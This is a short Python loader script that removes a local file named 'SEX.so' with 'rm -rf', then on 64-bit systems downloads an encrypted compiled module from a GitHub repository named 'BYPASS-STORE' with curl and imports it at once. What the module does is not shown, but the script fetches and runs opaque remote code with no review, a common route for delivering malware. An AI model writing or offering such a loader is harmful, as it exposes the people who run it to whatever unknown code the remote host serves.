import os, sys, platform
 
os.system('rm -rf SEX.so')
 
try:
    if sys.argv[1]=='update':
        os.system('rm -rf SEX.so')
except:
    pass
 
 
bit = platform.architecture()[0]
if bit == '64bit':
    if not os.path.isfile('SEX.so'):
        os.system('curl -L https://github.com/Peaky-XD/BYPASS-STORE/blob/main/TMC1_enc.cpython-311.so?raw=true -o SEX.so') 
        import SEX
    else:
        import SEX
 
elif bit == '32bit':sys.exit()

